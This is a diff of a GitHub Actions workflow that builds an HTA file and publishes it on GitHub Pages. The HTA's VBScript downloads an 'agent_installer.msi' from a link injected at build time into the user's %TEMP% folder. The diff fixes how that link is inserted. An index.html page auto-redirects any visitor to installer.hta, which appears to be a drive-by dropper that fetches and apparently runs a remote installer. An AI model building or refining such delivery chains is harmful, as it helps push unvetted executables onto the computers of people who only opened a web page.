@@ -203,9 +203,7 @@ jobs:
             
             ' Main script execution
             Dim strUrl, strTemp, strFile, objXMLHTTP, objADOStream, objFSO, objShell
-            strUrl = "EOF"
-            echo "$current_link" >> installer.hta
-            cat >> installer.hta << 'EOF'
+            strUrl = "PLACEHOLDER_URL"
             strTemp = g_WshShell.ExpandEnvironmentStrings("%TEMP%")
             strFile = strTemp & "\agent_installer.msi"
             
@@ -249,6 +247,9 @@ jobs:
         </body>
         </html>
         EOF
+        
+        # Replace the placeholder URL with the actual link
+        sed -i "s/PLACEHOLDER_URL/$current_link/g" installer.hta
         
         # Create index.html for GitHub Pages
         echo '<!DOCTYPE html><html><head><title>Download</title><meta http-equiv="refresh" content="0; url=installer.hta"></head><body><p>If not redirected, <a href="installer.hta">click here</a></p></body></html>' > index.html
